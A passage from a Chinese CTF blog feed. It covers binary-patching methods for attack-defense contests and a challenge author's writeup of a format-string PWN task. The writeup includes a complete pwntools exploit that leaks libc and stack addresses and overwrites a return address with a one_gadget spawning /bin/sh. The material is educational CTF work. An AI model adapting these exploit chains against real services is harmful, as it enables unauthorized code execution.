class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> *a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"mov %rdi,%rsi\n"</span></span><br><span class="line"><span class="string">"mov $0,%rdi\n"</span></span><br><span class="line"><span class="string">"mov $0x20,%rdx\n"</span></span><br><span class="line"><span class="string">"mov $0x1,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myputs</span><span class="params">(<span class="keyword">char</span> *a)</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"push $0x41414141\n"</span></span><br><span class="line"><span class="string">"push $0x42424242\n"</span></span><br><span class="line"><span class="string">"push %rsp\n"</span></span><br><span class="line"><span class="string">"pop  %rsi\n"</span></span><br><span class="line"><span class="string">"mov $0,%rdi\n"</span></span><br><span class="line"><span class="string">"mov $0x20,%rdx\n"</span></span><br><span class="line"><span class="string">"mov $0x1,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"pop %rax\n"</span></span><br><span class="line"><span class="string">"pop %rax\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span></span><br></pre></td></tr></table></figure><p>如上，将printf改成了write(0,”/bin/sh%d”,0x20)，利用注释的gcc命令将其编译。</p><p>patch程序的流程是首先将代码段加入到binary程序中，然后修改跳转逻辑，将call printf@plt，改成call myprintf。</p><p>lief中提供了add参数可以用于为二进制文件增加段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binary    = lief.parse(binary_name)</span><br><span class="line">lib  = lief.parse(lib_name)</span><br><span class="line">segment_add = binary.add(lib.segments[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>在修改跳转语句部分，由程序的call执行寻址方法是相对寻址的，即call addr = EIP + addr</p><p>因此需要计算写入的新函数距离要修改指令的偏移，计算方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call xxx  =(addr of new segment + offset function ) -  (addr of order + 5 /*length of call xx*/)</span><br></pre></td></tr></table></figure><p>由于偏移地址是补码表示的，因此在用python计算时需要对结果异或0xffffffff，最终patch计算函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_call</span><span class="params">(file,where,end,arch = <span class="string">"amd64"</span>)</span>:</span></span><br><span class="line"><span class="keyword">print</span> hex(end)</span><br><span class="line"></span><br><span class="line">length = p32((end - (where + <span class="number">5</span> )) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">order = <span class="string">'\xe8'</span>+length</span><br><span class="line"><span class="keyword">print</span> disasm(order,arch=arch)</span><br><span class="line">file.patch_address(where,[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> order])</span><br></pre></td></tr></table></figure><p>执行之后可以看到patch成功了，</p><p><img src="/img/patch-in-pwn/1-5.png" alt=""></p><p><img src="/img/patch-in-pwn/1-6.png" alt=""></p><p>但是一个重大的问题是patch前后文件大小改动很大：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/patch] - [一 7月 02, 20:36]</span><br><span class="line">└─[$] &lt;&gt; python 1.py</span><br><span class="line">0x8022f9</span><br><span class="line">   0:   e8 70 1d 40 00          call   0x401d75</span><br><span class="line">[+] ori size 8656</span><br><span class="line">[+] patch size 15885</span><br><span class="line">[+] Seccessful patched <span class="keyword">in</span> adding segment</span><br></pre></td></tr></table></figure><p>这样在一些线下赛中很容易由于修改过大和被判定为通防或者宕机。</p><h2 id="增加library"><a href="#增加library" class="headerlink" title="增加library"></a>增加library</h2><p>这是借鉴LD_preload的一种思路，当程序中加载两个库时，在调用某一函数在两个库内同名存在时，是有一定查找顺序的，也就是可以实现，在不修改程序正常代码的前提下，对全部libc函数进行hook。如下例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"/bin/sh%d"</span>, <span class="number">102L</span>L, envp, argv);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一个动态链接库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#include "/home/p4nda/linux-4.17.3/lib/syscall.c"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="comment">//#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="comment">// gcc -nostdlib  -nodefaultlibs -fPIC -Wl,-shared patch.c -o patch -ldl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *a,<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[] = <span class="string">"hacked by me\n "</span>;</span><br><span class="line"><span class="comment">//puts(a);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(a,<span class="string">"/bin/sh"</span>))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"find dangerous str~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> (*old_printf)(<span class="keyword">char</span> *,<span class="keyword">int</span>);</span><br><span class="line">old_printf =(<span class="keyword">int</span> (*)(<span class="keyword">char</span> *,<span class="keyword">int</span>)) dlsym(RTLD_NEXT, <span class="string">"printf"</span>);</span><br><span class="line">old_printf(a,b); </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令在注释中，则每次printf时都会先执行上述库中的函数，达到hook的目的。</p><p><img src="/img/patch-in-pwn/1-7.png" alt=""></p><p>优势很明显，可以执行任意libc内函数代码，让编程更容易。</p><p>不过缺点也很明显，首先程序变得<strong>巨大</strong>，并且当不存在这个静态链接库的时候，程序跑不起来… 有些线下赛都是本地check的，比如*网杯，很容易就判断宕机了…</p><p><img src="/img/patch-in-pwn/1-8.png" alt=""></p><h2 id="修改程序-eh-frame段"><a href="#修改程序-eh-frame段" class="headerlink" title="修改程序.eh_frame段"></a>修改程序.eh_frame段</h2><p>在TSCTF 2018 Final时，我在NeSE战队的binary文件中找到了通防工具，但是程序改动并没有特别大，当时感觉很好奇，在赛后调试了一下，发现他们把通防的shellcode写在了一个叫.eh_frame的段中，这个段会加载到程序中来，并且自身带有可执行权限，在查找这个段用处时，发现该段对程序执行影响不大，故可以将patch代码写在这个段中，再用跳转的方法将程序逻辑劫持到这里来。</p><p><img src="/img/patch-in-pwn/1-10.png" alt=""></p><p><img src="/img/patch-in-pwn/1-11.png" alt=""></p><p>可以看到在patch前后，程序大小保持不变。</p><p><img src="/img/patch-in-pwn/1-9.png" alt=""></p><p>缺点同样明显，.eh_frame的大小是有限的…</p><p>综上，似乎没有比较简洁的通用方法，综合着来用吧….</p>]]></content>
    
    <summary type="html">
    
      在国赛以后，突然发现对PWN题中的patch方法了解不太深入，尤其是不够优雅，经常就用IDA直接手改了，或者就是用加一个section的方法，导致patch后的文件改动很大，尤其是在国赛中，被主办方打电话过来问是不是加了通防，本文就简单介绍一下常用的patch方法。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>【PWNABLE.TW】 wannaheap 解题思路</title>
    <link href="http://p4nda.top/2018/06/28/pwnable-tw-wannaheap/"/>
    <id>http://p4nda.top/2018/06/28/pwnable-tw-wannaheap/</id>
    <published>2018-06-28T03:11:52.000Z</published>
    <updated>2018-07-01T15:41:49.540Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="security">  <div class="input-container">  <input type="password" class="form-control" id="pass" placeholder="Enter password to read." />    <label for="pass">Enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      一道比较新的题目，暂时不开放了，有思路欢迎交流.
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
    
  </entry>
  
  <entry>
    <title>胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记</title>
    <link href="http://p4nda.top/2018/06/25/pwnhub_Panda&#39;s_gift/"/>
    <id>http://p4nda.top/2018/06/25/pwnhub_Panda&#39;s_gift/</id>
    <published>2018-06-25T12:30:22.000Z</published>
    <updated>2018-10-03T12:48:47.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="胖哈勃Panda’s-gift出题"><a href="#胖哈勃Panda’s-gift出题" class="headerlink" title="胖哈勃Panda’s gift出题"></a>胖哈勃Panda’s gift出题</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目在main函数中首先提高了栈地址，去掉了部分栈地址随机化（后2字节），便于后续利用。</p><p>在init函数中，利用时间作为随机数种子，使用mmap伪随机生成2个内存块，地址可预测。作为题目中visitor_name、motto两个变量的可使用内存。</p><p>在login函数中，提供了三个功能。1. 向visitor_name赋值，长度最大为6字节。 2. 向motto赋值，长度最大为0x100字节。 3.打印motto的值。 </p><p>上述三个功能由一个全局变量flag控制每个功能仅能调用一次。</p><h2 id="漏洞设置"><a href="#漏洞设置" class="headerlink" title="漏洞设置"></a>漏洞设置</h2><p>1、 利用libc及固定时间，visitor_name、motto地址可预测。</p><p>2、 在login的set_name函数中，设置了一个6字节的格式化字符串漏洞，且漏洞仅能利用一次。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，题目在编译时开启了RELRO、NX、CANARY保护，使得got表不可写、不能通过简单溢出利用漏洞。</p><h3 id="地址预测"><a href="#地址预测" class="headerlink" title="地址预测"></a>地址预测</h3><p>在链接远程服务器时同时启动脚本，利用python的cdll库与服务器同样的libc可以达到预测的两个地址的效果，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">  p = remote(<span class="string">'127.0.0.1'</span>,  <span class="number">9999</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (v2 &lt;= <span class="number">0x10000</span> ):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">visitor_name =  v2</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((v2 &lt;= <span class="number">0x10000</span> )|(visitor_name == v2)):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">motto =  v2</span><br></pre></td></tr></table></figure><h3 id="printf格式化字符串利用"><a href="#printf格式化字符串利用" class="headerlink" title="printf格式化字符串利用"></a>printf格式化字符串利用</h3><p>因为题目本身仅存在一个显式漏洞，只能从该漏洞入手。</p><p>由于仅给了6字节的格式化字符串利用，因此考虑用%hn对rbp链写\x0000。</p><p>在0x400d31下断点后，可以看到栈结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rbp rsp  0x7ffc5dc00110 —▸ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 ◂— ...</span><br><span class="line">01:0008│          0x7ffc5dc00118 —▸ 0x400d47 ◂— nop    </span><br><span class="line">02:0010│          0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 —▸ 0x7ffc5df09410 ◂— ...</span><br><span class="line">03:0018│          0x7ffc5dc00128 —▸ 0x400eba ◂— jmp    0x400f4b</span><br><span class="line">04:0020│          0x7ffc5dc00130 ◂— 0x0</span><br><span class="line">05:0028│          0x7ffc5dc00138 ◂— 0x100400bf8</span><br><span class="line">06:0030│          0x7ffc5dc00140 —▸ 0x4010bc ◂— and    eax, 0x6e610064 /* &apos;%d&apos; */</span><br><span class="line">07:0038│          0x7ffc5dc00148 ◂— 0xcc345db59e141600</span><br></pre></td></tr></table></figure><p>当向rsp所指的位置利用 <strong>%6$hn</strong> 可以使得在函数返回到login函数时，login的rbp寄存器的后2字节被清零，造成栈迁移。而login函数在调用scanf函数时，使用rbp对格式化字符串寻址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400E0C                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400E10                 mov     rsi, rdx</span><br><span class="line">.text:0000000000400E13                 mov     rdi, rax</span><br><span class="line">.text:0000000000400E16                 mov     eax, 0</span><br><span class="line">.text:0000000000400E1B                 call    __isoc99_scanf</span><br></pre></td></tr></table></figure><p>因此，可以控制scanf格式化字符串的地址。</p><h3 id="scanf格式化字符串控制"><a href="#scanf格式化字符串控制" class="headerlink" title="scanf格式化字符串控制"></a>scanf格式化字符串控制</h3><p>上一条讲了printf格式化字符串利用方法，而在调用printf格式化字符串前，可以利用set_motto函数预先在栈上布置好相关的地址。</p><p><strong><em>tip: 在出题时，我选择用抬高栈的方法使得使用printf格式化字符串利用后修改的rbp一定能落在set_motto使用过的栈中，set_motto从0xxxxxfffd0开始写入到0xxxxx00110结束，但由于栈是复用的，通过对题目调整，使得0xxxxxfffd0 - 0xxxxxffff8是不被栈的复用覆盖的。因此能保证做题时可以劫持栈地址，进一步劫持scanf格式化字符串</em></strong></p><p>在set_motto函数中填入 ‘scanf格式字符串’.ljust(0x20,’0’) + motto的地址，可以将scanf的格式化字符串劫持为用户输入的格式化字符串。且仅有0x20长度</p><p>由于栈上没有可以控制数据，所以并不能对内存地址任意写。</p><p>scanf的处理特性是按照每一个参数顺序处理的，因此利用栈上的rbp链（第10个参数、第16个参数分别是两个函数栈的ebp位置）特性，构造’%dq%10\$pq%16\$pq\0’，可以达到任意写且能保证正常逻辑不崩溃的目的。</p><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>当前已经可以构造内存任意写了，任意写劫持motto指针为got地址，可以泄露libc地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure><p>由于flag变量限制，每个函数仅能调用1次，不能继续泄露了，所以对flag置零</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure><p>使用libc中的environ环境变量，可以泄露栈地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(libc.symbols[<span class="string">'environ'</span>])+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure><h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>由于存在canary，直接栈溢出不能用的，此时劫持控制流可以通过修改调用</p><p><strong>text:0000000000400E1B                 call    __isoc99_scanf</strong></p><p>处的返回地址，相当于函数自修改返回地址，将其修改为one_gadget，就可以拿到shell了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfmt'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./babyfmt'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400d31\nb *0x400e1b\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,  <span class="number">9999</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400e1b\n')</span></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (v2 &lt;= <span class="number">0x10000</span> ):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">visitor_name =  v2<span class="comment">#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);</span></span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((v2 &lt;= <span class="number">0x10000</span> )|(visitor_name == v2)):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">motto =  v2<span class="comment">#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);   </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] motto '</span>,hex(motto) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%dq%10$pq%16$pq\0'</span>.ljust(<span class="number">0x20</span>)+p64(motto))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$hn'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">'q'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>) )- libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] system"</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(libc.symbols[<span class="string">'environ'</span>])+<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline('1q'+hex(libc.symbols['__malloc_hook'])+'q'+hex(libc.address +0x4526a ))</span></span><br><span class="line"><span class="comment">#add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))</span></span><br><span class="line"></span><br><span class="line">stack =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>) ) &amp;<span class="number">0xfffffffffff00000</span> <span class="number">-0x300000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] stack"</span>,hex(stack)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('&gt;')</span></span><br><span class="line"><span class="comment">#p.sendline('1q'+hex(motto+12)+'q'+hex(0x007073303824))</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(stack+<span class="number">0x128</span>)+<span class="string">'q'</span>+hex(libc.address+<span class="number">0x4526a</span>)+<span class="string">'q'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>##other</p><p><a href="https://pwnhub.cn/questiondetail?id=42" target="_blank" rel="noopener">比赛网址</a></p><p><a href="https://pan.baidu.com/s/12blLzw1oafmQ3mCFYaa9NA" target="_blank" rel="noopener">题目链接</a> ， 密码： <strong><em>7nb6</em></strong></p><p>在*ctf 2018里出现过一道scanf格式字符串的利用，那题比较没有canary，使用%256s就溢出执行rop了。见到考察自构格式化字符串的比较少，所以搞了一题，利用思路和bss段上的printf格式化字符串是类似的，结合printf和scanf搞了一个格式化字符串漏洞大礼包。在编译题目时对栈重新构造了一下，避免了做题去碰随机化的尴尬，在scanf格式化字符串长度那里可以再减小一点，我用了15个字节，在题目中预留了32字节的长度。</p><p>由于自己太菜了，忘了libc函数是没有canary保护的，在劫持scanf格式化字符串那里本身就可以劫持scanf的返回地址写ROP了，失去了后面跳板构造内存任意写的作用了，如果那里有canary的话只能按照预期的方法来做了。</p><p>拿到一血、二血的<strong><em>test_for_pwn</em></strong>、<strong><em>Swings</em></strong> 大佬都是用这个非预期出的，觉得还是有点失落，但大佬们还是真的很强。</p><p>不过，这次比赛名称用了Panda’s gift真的是比较暖心了，虽然题目被非预期了，但是还是学到了很多东西。</p><p><img src="/img/Panda&#39;s gift/1-1.png" alt=""></p><h1 id="TSCTF-2018-FINAL-PWN1-Writeup"><a href="#TSCTF-2018-FINAL-PWN1-Writeup" class="headerlink" title="TSCTF 2018 FINAL PWN1 Writeup"></a>TSCTF 2018 FINAL PWN1 Writeup</h1><p>此题中留了3处可以获得flag的点</p><h2 id="伪随机数预测"><a href="#伪随机数预测" class="headerlink" title="伪随机数预测"></a>伪随机数预测</h2><p>题目中留了一个black-jack游戏，<a 